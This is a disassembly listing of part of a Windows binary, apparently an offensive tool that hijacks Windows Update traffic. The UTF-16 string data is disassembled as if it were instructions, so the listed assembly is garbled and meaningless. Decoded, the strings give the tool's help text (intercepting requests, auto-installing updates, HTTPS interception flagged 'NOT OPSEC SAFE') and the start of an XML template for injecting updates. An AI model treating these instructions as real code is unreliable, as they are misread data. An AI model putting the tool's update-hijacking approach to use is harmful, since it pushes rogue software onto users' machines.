  408a45:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408a4b:	73 00                	jae    0x408a4d
  408a4d:	29 00                	sub    %eax,(%eax)
  408a4f:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  408a54:	00 20                	add    %ah,(%eax)
  408a56:	00 20                	add    %ah,(%eax)
  408a58:	00 20                	add    %ah,(%eax)
  408a5a:	00 20                	add    %ah,(%eax)
  408a5c:	00 20                	add    %ah,(%eax)
  408a5e:	00 20                	add    %ah,(%eax)
  408a60:	00 20                	add    %ah,(%eax)
  408a62:	00 20                	add    %ah,(%eax)
  408a64:	00 20                	add    %ah,(%eax)
  408a66:	00 20                	add    %ah,(%eax)
  408a68:	00 20                	add    %ah,(%eax)
  408a6a:	00 20                	add    %ah,(%eax)
  408a6c:	00 20                	add    %ah,(%eax)
  408a6e:	00 20                	add    %ah,(%eax)
  408a70:	00 20                	add    %ah,(%eax)
  408a72:	00 20                	add    %ah,(%eax)
  408a74:	00 20                	add    %ah,(%eax)
  408a76:	00 20                	add    %ah,(%eax)
  408a78:	00 20                	add    %ah,(%eax)
  408a7a:	00 20                	add    %ah,(%eax)
  408a7c:	00 20                	add    %ah,(%eax)
  408a7e:	00 20                	add    %ah,(%eax)
  408a80:	00 20                	add    %ah,(%eax)
  408a82:	00 20                	add    %ah,(%eax)
  408a84:	00 20                	add    %ah,(%eax)
  408a86:	00 20                	add    %ah,(%eax)
  408a88:	00 20                	add    %ah,(%eax)
  408a8a:	00 20                	add    %ah,(%eax)
  408a8c:	00 20                	add    %ah,(%eax)
  408a8e:	00 20                	add    %ah,(%eax)
  408a90:	00 20                	add    %ah,(%eax)
  408a92:	00 20                	add    %ah,(%eax)
  408a94:	00 20                	add    %ah,(%eax)
  408a96:	00 20                	add    %ah,(%eax)
  408a98:	00 20                	add    %ah,(%eax)
  408a9a:	00 20                	add    %ah,(%eax)
  408a9c:	00 20                	add    %ah,(%eax)
  408a9e:	00 49 00             	add    %cl,0x0(%ecx)
  408aa1:	66 00 20             	data16 add %ah,(%eax)
  408aa4:	00 6e 00             	add    %ch,0x0(%esi)
  408aa7:	6f                   	outsl  %ds:(%esi),(%dx)
  408aa8:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  408aac:	00 73 00             	add    %dh,0x0(%ebx)
  408aaf:	70 00                	jo     0x408ab1
  408ab1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408ab5:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  408abb:	65 00 64 00 2c       	add    %ah,%gs:0x2c(%eax,%eax,1)
  408ac0:	00 20                	add    %ah,(%eax)
  408ac2:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408ac6:	00 65 00             	add    %ah,0x0(%ebp)
  408ac9:	20 00                	and    %al,(%eax)
  408acb:	73 00                	jae    0x408acd
  408acd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408ad1:	76 00                	jbe    0x408ad3
  408ad3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408ad7:	20 00                	and    %al,(%eax)
  408ad9:	77 00                	ja     0x408adb
  408adb:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  408ae1:	20 00                	and    %al,(%eax)
  408ae3:	74 00                	je     0x408ae5
  408ae5:	72 00                	jb     0x408ae7
  408ae7:	79 00                	jns    0x408ae9
  408ae9:	20 00                	and    %al,(%eax)
  408aeb:	74 00                	je     0x408aed
  408aed:	6f                   	outsl  %ds:(%esi),(%dx)
  408aee:	00 20                	add    %ah,(%eax)
  408af0:	00 69 00             	add    %ch,0x0(%ecx)
  408af3:	6e                   	outsb  %ds:(%esi),(%dx)
  408af4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408af8:	00 72 00             	add    %dh,0x0(%edx)
  408afb:	63 00                	arpl   %eax,(%eax)
  408afd:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  408b01:	74 00                	je     0x408b03
  408b03:	20 00                	and    %al,(%eax)
  408b05:	74 00                	je     0x408b07
  408b07:	68 00 65 00 20       	push   $0x20006500
  408b0c:	00 72 00             	add    %dh,0x0(%edx)
  408b0f:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  408b13:	75 00                	jne    0x408b15
  408b15:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408b19:	74 00                	je     0x408b1b
  408b1b:	20 00                	and    %al,(%eax)
  408b1d:	74 00                	je     0x408b1f
  408b1f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b20:	00 20                	add    %ah,(%eax)
  408b22:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408b26:	00 65 00             	add    %ah,0x0(%ebp)
  408b29:	20 00                	and    %al,(%eax)
  408b2b:	6c                   	insb   (%dx),%es:(%edi)
  408b2c:	00 65 00             	add    %ah,0x0(%ebp)
  408b2f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  408b33:	74 00                	je     0x408b35
  408b35:	69 00 6d 00 61 00    	imul   $0x61006d,(%eax),%eax
  408b3b:	74 00                	je     0x408b3d
  408b3d:	65 00 20             	add    %ah,%gs:(%eax)
  408b40:	00 73 00             	add    %dh,0x0(%ebx)
  408b43:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408b47:	76 00                	jbe    0x408b49
  408b49:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408b4d:	20 00                	and    %al,(%eax)
  408b4f:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  408b55:	74 00                	je     0x408b57
  408b57:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408b5b:	64 00 2e             	add    %ch,%fs:(%esi)
  408b5e:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408b64:	00 20                	add    %ah,(%eax)
  408b66:	00 20                	add    %ah,(%eax)
  408b68:	00 20                	add    %ah,(%eax)
  408b6a:	00 20                	add    %ah,(%eax)
  408b6c:	00 20                	add    %ah,(%eax)
  408b6e:	00 20                	add    %ah,(%eax)
  408b70:	00 20                	add    %ah,(%eax)
  408b72:	00 20                	add    %ah,(%eax)
  408b74:	00 20                	add    %ah,(%eax)
  408b76:	00 20                	add    %ah,(%eax)
  408b78:	00 20                	add    %ah,(%eax)
  408b7a:	00 20                	add    %ah,(%eax)
  408b7c:	00 20                	add    %ah,(%eax)
  408b7e:	00 20                	add    %ah,(%eax)
  408b80:	00 20                	add    %ah,(%eax)
  408b82:	00 20                	add    %ah,(%eax)
  408b84:	00 20                	add    %ah,(%eax)
  408b86:	00 2f                	add    %ch,(%edi)
  408b88:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  408b8c:	00 62 00             	add    %ah,0x0(%edx)
  408b8f:	75 00                	jne    0x408b91
  408b91:	67 00 20             	add    %ah,(%bx,%si)
  408b94:	00 20                	add    %ah,(%eax)
  408b96:	00 20                	add    %ah,(%eax)
  408b98:	00 20                	add    %ah,(%eax)
  408b9a:	00 20                	add    %ah,(%eax)
  408b9c:	00 20                	add    %ah,(%eax)
  408b9e:	00 20                	add    %ah,(%eax)
  408ba0:	00 20                	add    %ah,(%eax)
  408ba2:	00 20                	add    %ah,(%eax)
  408ba4:	00 20                	add    %ah,(%eax)
  408ba6:	00 20                	add    %ah,(%eax)
  408ba8:	00 20                	add    %ah,(%eax)
  408baa:	00 20                	add    %ah,(%eax)
  408bac:	00 20                	add    %ah,(%eax)
  408bae:	00 49 00             	add    %cl,0x0(%ecx)
  408bb1:	6e                   	outsb  %ds:(%esi),(%dx)
  408bb2:	00 63 00             	add    %ah,0x0(%ebx)
  408bb5:	72 00                	jb     0x408bb7
  408bb7:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408bbb:	73 00                	jae    0x408bbd
  408bbd:	65 00 20             	add    %ah,%gs:(%eax)
  408bc0:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408bc4:	00 65 00             	add    %ah,0x0(%ebp)
  408bc7:	20 00                	and    %al,(%eax)
  408bc9:	76 00                	jbe    0x408bcb
  408bcb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408bcf:	62 00                	bound  %eax,(%eax)
  408bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  408bd2:	00 73 00             	add    %dh,0x0(%ebx)
  408bd5:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  408bdb:	20 00                	and    %al,(%eax)
  408bdd:	6f                   	outsl  %ds:(%esi),(%dx)
  408bde:	00 66 00             	add    %ah,0x0(%esi)
  408be1:	20 00                	and    %al,(%eax)
  408be3:	74 00                	je     0x408be5
  408be5:	68 00 65 00 20       	push   $0x20006500
  408bea:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408bee:	00 6f 00             	add    %ch,0x0(%edi)
  408bf1:	6c                   	insb   (%dx),%es:(%edi)
  408bf2:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408bf8:	00 20                	add    %ah,(%eax)
  408bfa:	00 20                	add    %ah,(%eax)
  408bfc:	00 20                	add    %ah,(%eax)
  408bfe:	00 20                	add    %ah,(%eax)
  408c00:	00 20                	add    %ah,(%eax)
  408c02:	00 20                	add    %ah,(%eax)
  408c04:	00 20                	add    %ah,(%eax)
  408c06:	00 20                	add    %ah,(%eax)
  408c08:	00 20                	add    %ah,(%eax)
  408c0a:	00 20                	add    %ah,(%eax)
  408c0c:	00 20                	add    %ah,(%eax)
  408c0e:	00 20                	add    %ah,(%eax)
  408c10:	00 20                	add    %ah,(%eax)
  408c12:	00 20                	add    %ah,(%eax)
  408c14:	00 20                	add    %ah,(%eax)
  408c16:	00 20                	add    %ah,(%eax)
  408c18:	00 20                	add    %ah,(%eax)
  408c1a:	00 2f                	add    %ch,(%edi)
  408c1c:	00 61 00             	add    %ah,0x0(%ecx)
  408c1f:	75 00                	jne    0x408c21
  408c21:	74 00                	je     0x408c23
  408c23:	6f                   	outsl  %ds:(%esi),(%dx)
  408c24:	00 69 00             	add    %ch,0x0(%ecx)
  408c27:	6e                   	outsb  %ds:(%esi),(%dx)
  408c28:	00 73 00             	add    %dh,0x0(%ebx)
  408c2b:	74 00                	je     0x408c2d
  408c2d:	61                   	popa
  408c2e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408c32:	00 20                	add    %ah,(%eax)
  408c34:	00 20                	add    %ah,(%eax)
  408c36:	00 20                	add    %ah,(%eax)
  408c38:	00 20                	add    %ah,(%eax)
  408c3a:	00 20                	add    %ah,(%eax)
  408c3c:	00 20                	add    %ah,(%eax)
  408c3e:	00 20                	add    %ah,(%eax)
  408c40:	00 20                	add    %ah,(%eax)
  408c42:	00 53 00             	add    %dl,0x0(%ebx)
  408c45:	74 00                	je     0x408c47
  408c47:	61                   	popa
  408c48:	00 72 00             	add    %dh,0x0(%edx)
  408c4b:	74 00                	je     0x408c4d
  408c4d:	20 00                	and    %al,(%eax)
  408c4f:	57                   	push   %edi
  408c50:	00 69 00             	add    %ch,0x0(%ecx)
  408c53:	6e                   	outsb  %ds:(%esi),(%dx)
  408c54:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408c58:	00 77 00             	add    %dh,0x0(%edi)
  408c5b:	73 00                	jae    0x408c5d
  408c5d:	20 00                	and    %al,(%eax)
  408c5f:	75 00                	jne    0x408c61
  408c61:	70 00                	jo     0x408c63
  408c63:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408c67:	74 00                	je     0x408c69
  408c69:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408c6d:	20 00                	and    %al,(%eax)
  408c6f:	61                   	popa
  408c70:	00 75 00             	add    %dh,0x0(%ebp)
  408c73:	74 00                	je     0x408c75
  408c75:	6f                   	outsl  %ds:(%esi),(%dx)
  408c76:	00 6d 00             	add    %ch,0x0(%ebp)
  408c79:	61                   	popa
  408c7a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408c7e:	00 63 00             	add    %ah,0x0(%ebx)
  408c81:	61                   	popa
  408c82:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408c86:	00 79 00             	add    %bh,0x0(%ecx)
  408c89:	20 00                	and    %al,(%eax)
  408c8b:	61                   	popa
  408c8c:	00 66 00             	add    %ah,0x0(%esi)
  408c8f:	74 00                	je     0x408c91
  408c91:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408c95:	20 00                	and    %al,(%eax)
  408c97:	74 00                	je     0x408c99
  408c99:	68 00 65 00 20       	push   $0x20006500
  408c9e:	00 70 00             	add    %dh,0x0(%eax)
  408ca1:	72 00                	jb     0x408ca3
  408ca3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca4:	00 78 00             	add    %bh,0x0(%eax)
  408ca7:	79 00                	jns    0x408ca9
  408ca9:	20 00                	and    %al,(%eax)
  408cab:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  408cb1:	73 00                	jae    0x408cb3
  408cb3:	74 00                	je     0x408cb5
  408cb5:	61                   	popa
  408cb6:	00 72 00             	add    %dh,0x0(%edx)
  408cb9:	74 00                	je     0x408cbb
  408cbb:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  408cc0:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408cc6:	00 20                	add    %ah,(%eax)
  408cc8:	00 20                	add    %ah,(%eax)
  408cca:	00 20                	add    %ah,(%eax)
  408ccc:	00 20                	add    %ah,(%eax)
  408cce:	00 20                	add    %ah,(%eax)
  408cd0:	00 20                	add    %ah,(%eax)
  408cd2:	00 20                	add    %ah,(%eax)
  408cd4:	00 20                	add    %ah,(%eax)
  408cd6:	00 20                	add    %ah,(%eax)
  408cd8:	00 20                	add    %ah,(%eax)
  408cda:	00 20                	add    %ah,(%eax)
  408cdc:	00 20                	add    %ah,(%eax)
  408cde:	00 20                	add    %ah,(%eax)
  408ce0:	00 20                	add    %ah,(%eax)
  408ce2:	00 20                	add    %ah,(%eax)
  408ce4:	00 20                	add    %ah,(%eax)
  408ce6:	00 20                	add    %ah,(%eax)
  408ce8:	00 2f                	add    %ch,(%edi)
  408cea:	00 65 00             	add    %ah,0x0(%ebp)
  408ced:	6e                   	outsb  %ds:(%esi),(%dx)
  408cee:	00 61 00             	add    %ah,0x0(%ecx)
  408cf1:	62 00                	bound  %eax,(%eax)
  408cf3:	6c                   	insb   (%dx),%es:(%edi)
  408cf4:	00 65 00             	add    %ah,0x0(%ebp)
  408cf7:	74 00                	je     0x408cf9
  408cf9:	6c                   	insb   (%dx),%es:(%edi)
  408cfa:	00 73 00             	add    %dh,0x0(%ebx)
  408cfd:	20 00                	and    %al,(%eax)
  408cff:	20 00                	and    %al,(%eax)
  408d01:	20 00                	and    %al,(%eax)
  408d03:	20 00                	and    %al,(%eax)
  408d05:	20 00                	and    %al,(%eax)
  408d07:	20 00                	and    %al,(%eax)
  408d09:	20 00                	and    %al,(%eax)
  408d0b:	20 00                	and    %al,(%eax)
  408d0d:	20 00                	and    %al,(%eax)
  408d0f:	20 00                	and    %al,(%eax)
  408d11:	45                   	inc    %ebp
  408d12:	00 6e 00             	add    %ch,0x0(%esi)
  408d15:	61                   	popa
  408d16:	00 62 00             	add    %ah,0x0(%edx)
  408d19:	6c                   	insb   (%dx),%es:(%edi)
  408d1a:	00 65 00             	add    %ah,0x0(%ebp)
  408d1d:	20 00                	and    %al,(%eax)
  408d1f:	48                   	dec    %eax
  408d20:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  408d24:	00 50 00             	add    %dl,0x0(%eax)
  408d27:	53                   	push   %ebx
  408d28:	00 20                	add    %ah,(%eax)
  408d2a:	00 69 00             	add    %ch,0x0(%ecx)
  408d2d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408d32:	00 72 00             	add    %dh,0x0(%edx)
  408d35:	63 00                	arpl   %eax,(%eax)
  408d37:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  408d3b:	74 00                	je     0x408d3d
  408d3d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d43:	2e 00 20             	add    %ah,%cs:(%eax)
  408d46:	00 57 00             	add    %dl,0x0(%edi)
  408d49:	41                   	inc    %ecx
  408d4a:	00 52 00             	add    %dl,0x0(%edx)
  408d4d:	4e                   	dec    %esi
  408d4e:	00 49 00             	add    %cl,0x0(%ecx)
  408d51:	4e                   	dec    %esi
  408d52:	00 47 00             	add    %al,0x0(%edi)
  408d55:	2e 00 20             	add    %ah,%cs:(%eax)
  408d58:	00 4e 00             	add    %cl,0x0(%esi)
  408d5b:	4f                   	dec    %edi
  408d5c:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  408d60:	00 4f 00             	add    %cl,0x0(%edi)
  408d63:	50                   	push   %eax
  408d64:	00 53 00             	add    %dl,0x0(%ebx)
  408d67:	45                   	inc    %ebp
  408d68:	00 43 00             	add    %al,0x0(%ebx)
  408d6b:	20 00                	and    %al,(%eax)
  408d6d:	53                   	push   %ebx
  408d6e:	00 41 00             	add    %al,0x0(%ecx)
  408d71:	46                   	inc    %esi
  408d72:	00 45 00             	add    %al,0x0(%ebp)
  408d75:	2e 00 20             	add    %ah,%cs:(%eax)
  408d78:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408d7e:	00 20                	add    %ah,(%eax)
  408d80:	00 20                	add    %ah,(%eax)
  408d82:	00 20                	add    %ah,(%eax)
  408d84:	00 20                	add    %ah,(%eax)
  408d86:	00 20                	add    %ah,(%eax)
  408d88:	00 20                	add    %ah,(%eax)
  408d8a:	00 20                	add    %ah,(%eax)
  408d8c:	00 20                	add    %ah,(%eax)
  408d8e:	00 20                	add    %ah,(%eax)
  408d90:	00 20                	add    %ah,(%eax)
  408d92:	00 20                	add    %ah,(%eax)
  408d94:	00 20                	add    %ah,(%eax)
  408d96:	00 20                	add    %ah,(%eax)
  408d98:	00 20                	add    %ah,(%eax)
  408d9a:	00 20                	add    %ah,(%eax)
  408d9c:	00 20                	add    %ah,(%eax)
  408d9e:	00 20                	add    %ah,(%eax)
  408da0:	00 20                	add    %ah,(%eax)
  408da2:	00 20                	add    %ah,(%eax)
  408da4:	00 20                	add    %ah,(%eax)
  408da6:	00 20                	add    %ah,(%eax)
  408da8:	00 20                	add    %ah,(%eax)
  408daa:	00 20                	add    %ah,(%eax)
  408dac:	00 20                	add    %ah,(%eax)
  408dae:	00 20                	add    %ah,(%eax)
  408db0:	00 20                	add    %ah,(%eax)
  408db2:	00 20                	add    %ah,(%eax)
  408db4:	00 20                	add    %ah,(%eax)
  408db6:	00 20                	add    %ah,(%eax)
  408db8:	00 20                	add    %ah,(%eax)
  408dba:	00 20                	add    %ah,(%eax)
  408dbc:	00 20                	add    %ah,(%eax)
  408dbe:	00 20                	add    %ah,(%eax)
  408dc0:	00 20                	add    %ah,(%eax)
  408dc2:	00 20                	add    %ah,(%eax)
  408dc4:	00 20                	add    %ah,(%eax)
  408dc6:	00 20                	add    %ah,(%eax)
  408dc8:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  408dcc:	00 69 00             	add    %ch,0x0(%ecx)
  408dcf:	73 00                	jae    0x408dd1
  408dd1:	20 00                	and    %al,(%eax)
  408dd3:	77 00                	ja     0x408dd5
  408dd5:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  408ddb:	20 00                	and    %al,(%eax)
  408ddd:	70 00                	jo     0x408ddf
  408ddf:	72 00                	jb     0x408de1
  408de1:	6f                   	outsl  %ds:(%esi),(%dx)
  408de2:	00 6d 00             	add    %ch,0x0(%ebp)
  408de5:	70 00                	jo     0x408de7
  408de7:	74 00                	je     0x408de9
  408de9:	20 00                	and    %al,(%eax)
  408deb:	74 00                	je     0x408ded
  408ded:	68 00 65 00 20       	push   $0x20006500
  408df2:	00 75 00             	add    %dh,0x0(%ebp)
  408df5:	73 00                	jae    0x408df7
  408df7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408dfb:	20 00                	and    %al,(%eax)
  408dfd:	74 00                	je     0x408dff
  408dff:	6f                   	outsl  %ds:(%esi),(%dx)
  408e00:	00 20                	add    %ah,(%eax)
  408e02:	00 61 00             	add    %ah,0x0(%ecx)
  408e05:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  408e0a:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408e0e:	00 65 00             	add    %ah,0x0(%ebp)
  408e11:	20 00                	and    %al,(%eax)
  408e13:	63 00                	arpl   %eax,(%eax)
  408e15:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408e19:	74 00                	je     0x408e1b
  408e1b:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  408e21:	63 00                	arpl   %eax,(%eax)
  408e23:	61                   	popa
  408e24:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408e28:	00 20                	add    %ah,(%eax)
  408e2a:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408e2e:	00 20                	add    %ah,(%eax)
  408e30:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  408e34:	00 65 00             	add    %ah,0x0(%ebp)
  408e37:	20 00                	and    %al,(%eax)
  408e39:	74 00                	je     0x408e3b
  408e3b:	72 00                	jb     0x408e3d
  408e3d:	75 00                	jne    0x408e3f
  408e3f:	73 00                	jae    0x408e41
  408e41:	74 00                	je     0x408e43
  408e43:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  408e48:	00 72 00             	add    %dh,0x0(%edx)
  408e4b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e4c:	00 6f 00             	add    %ch,0x0(%edi)
  408e4f:	74 00                	je     0x408e51
  408e51:	2e 00 0d 00 0a 00 20 	add    %cl,%cs:0x20000a00
  408e58:	00 20                	add    %ah,(%eax)
  408e5a:	00 20                	add    %ah,(%eax)
  408e5c:	00 20                	add    %ah,(%eax)
  408e5e:	00 20                	add    %ah,(%eax)
  408e60:	00 20                	add    %ah,(%eax)
  408e62:	00 20                	add    %ah,(%eax)
  408e64:	00 20                	add    %ah,(%eax)
  408e66:	00 20                	add    %ah,(%eax)
  408e68:	00 20                	add    %ah,(%eax)
  408e6a:	00 20                	add    %ah,(%eax)
  408e6c:	00 20                	add    %ah,(%eax)
  408e6e:	00 20                	add    %ah,(%eax)
  408e70:	00 20                	add    %ah,(%eax)
  408e72:	00 20                	add    %ah,(%eax)
  408e74:	00 20                	add    %ah,(%eax)
  408e76:	00 20                	add    %ah,(%eax)
  408e78:	00 20                	add    %ah,(%eax)
  408e7a:	00 2f                	add    %ch,(%edi)
  408e7c:	00 68 00             	add    %ch,0x0(%eax)
  408e7f:	65 00 6c 00 70       	add    %ch,%gs:0x70(%eax,%eax,1)
  408e84:	00 20                	add    %ah,(%eax)
  408e86:	00 20                	add    %ah,(%eax)
  408e88:	00 20                	add    %ah,(%eax)
  408e8a:	00 20                	add    %ah,(%eax)
  408e8c:	00 20                	add    %ah,(%eax)
  408e8e:	00 20                	add    %ah,(%eax)
  408e90:	00 20                	add    %ah,(%eax)
  408e92:	00 20                	add    %ah,(%eax)
  408e94:	00 20                	add    %ah,(%eax)
  408e96:	00 20                	add    %ah,(%eax)
  408e98:	00 20                	add    %ah,(%eax)
  408e9a:	00 20                	add    %ah,(%eax)
  408e9c:	00 20                	add    %ah,(%eax)
  408e9e:	00 20                	add    %ah,(%eax)
  408ea0:	00 20                	add    %ah,(%eax)
  408ea2:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  408ea6:	00 73 00             	add    %dh,0x0(%ebx)
  408ea9:	70 00                	jo     0x408eab
  408eab:	6c                   	insb   (%dx),%es:(%edi)
  408eac:	00 61 00             	add    %ah,0x0(%ecx)
  408eaf:	79 00                	jns    0x408eb1
  408eb1:	20 00                	and    %al,(%eax)
  408eb3:	74 00                	je     0x408eb5
  408eb5:	68 00 69 00 73       	push   $0x73006900
  408eba:	00 20                	add    %ah,(%eax)
  408ebc:	00 68 00             	add    %ch,0x0(%eax)
  408ebf:	65 00 6c 00 70       	add    %ch,%gs:0x70(%eax,%eax,1)
  408ec4:	00 20                	add    %ah,(%eax)
  408ec6:	00 61 00             	add    %ah,0x0(%ecx)
  408ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  408eca:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  408ece:	00 65 00             	add    %ah,0x0(%ebp)
  408ed1:	78 00                	js     0x408ed3
  408ed3:	69 00 74 00 0d 00    	imul   $0xd0074,(%eax),%eax
  408ed9:	0a 00                	or     (%eax),%al
  408edb:	20 00                	and    %al,(%eax)
  408edd:	20 00                	and    %al,(%eax)
  408edf:	20 00                	and    %al,(%eax)
  408ee1:	20 00                	and    %al,(%eax)
  408ee3:	20 00                	and    %al,(%eax)
  408ee5:	20 00                	and    %al,(%eax)
  408ee7:	20 00                	and    %al,(%eax)
  408ee9:	20 00                	and    %al,(%eax)
  408eeb:	20 00                	and    %al,(%eax)
  408eed:	20 00                	and    %al,(%eax)
  408eef:	20 00                	and    %al,(%eax)
  408ef1:	20 00                	and    %al,(%eax)
  408ef3:	01 8c 13 0d 00 0a 00 	add    %ecx,0xa000d(%ebx,%edx,1)
  408efa:	3c 00                	cmp    $0x0,%al
  408efc:	4e                   	dec    %esi
  408efd:	00 65 00             	add    %ah,0x0(%ebp)
  408f00:	77 00                	ja     0x408f02
  408f02:	55                   	push   %ebp
  408f03:	00 70 00             	add    %dh,0x0(%eax)
  408f06:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408f0a:	74 00                	je     0x408f0c
  408f0c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408f10:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  408f17:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408f1a:	55                   	push   %ebp
  408f1b:	00 70 00             	add    %dh,0x0(%eax)
  408f1e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408f22:	74 00                	je     0x408f24
  408f24:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408f28:	6e                   	outsb  %ds:(%esi),(%dx)
  408f29:	00 66 00             	add    %ah,0x0(%esi)
  408f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f2d:	00 3e                	add    %bh,(%esi)
  408f2f:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  408f35:	00 09                	add    %cl,(%ecx)
  408f37:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408f3a:	49                   	dec    %ecx
  408f3b:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  408f3f:	00 7b 00             	add    %bh,0x0(%ebx)
  408f42:	30 00                	xor    %al,(%eax)
  408f44:	7d 00                	jge    0x408f46
  408f46:	3c 00                	cmp    $0x0,%al
  408f48:	2f                   	das
  408f49:	00 49 00             	add    %cl,0x0(%ecx)
  408f4c:	44                   	inc    %esp
  408f4d:	00 3e                	add    %bh,(%esi)
  408f4f:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  408f55:	00 09                	add    %cl,(%ecx)
  408f57:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408f5a:	44                   	inc    %esp
  408f5b:	00 65 00             	add    %ah,0x0(%ebp)
  408f5e:	70 00                	jo     0x408f60
  408f60:	6c                   	insb   (%dx),%es:(%edi)
  408f61:	00 6f 00             	add    %ch,0x0(%edi)
  408f64:	79 00                	jns    0x408f66
  408f66:	6d                   	insl   (%dx),%es:(%edi)
  408f67:	00 65 00             	add    %ah,0x0(%ebp)
  408f6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6b:	00 74 00 3e          	add    %dh,0x3e(%eax,%eax,1)
  408f6f:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  408f75:	00 09                	add    %cl,(%ecx)
  408f77:	00 09                	add    %cl,(%ecx)
  408f79:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408f7c:	49                   	dec    %ecx
  408f7d:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  408f81:	00 7b 00             	add    %bh,0x0(%ebx)
  408f84:	31 00                	xor    %eax,(%eax)
  408f86:	7d 00                	jge    0x408f88
  408f88:	3c 00                	cmp    $0x0,%al
  408f8a:	2f                   	das
  408f8b:	00 49 00             	add    %cl,0x0(%ecx)
  408f8e:	44                   	inc    %esp
  408f8f:	00 3e                	add    %bh,(%esi)
  408f91:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  408f97:	00 09                	add    %cl,(%ecx)
  408f99:	00 09                	add    %cl,(%ecx)
  408f9b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408f9e:	41                   	inc    %ecx
  408f9f:	00 63 00             	add    %ah,0x0(%ebx)
  408fa2:	74 00                	je     0x408fa4
  408fa4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408faa:	3e 00 49 00          	add    %cl,%ds:0x0(%ecx)
  408fae:	6e                   	outsb  %ds:(%esi),(%dx)
  408faf:	00 73 00             	add    %dh,0x0(%ebx)
  408fb2:	74 00                	je     0x408fb4
  408fb4:	61                   	popa
  408fb5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408fb9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408fbc:	2f                   	das
  408fbd:	00 41 00             	add    %al,0x0(%ecx)
  408fc0:	63 00                	arpl   %eax,(%eax)
  408fc2:	74 00                	je     0x408fc4
  408fc4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408fca:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  408fd1:	00 09                	add    %cl,(%ecx)
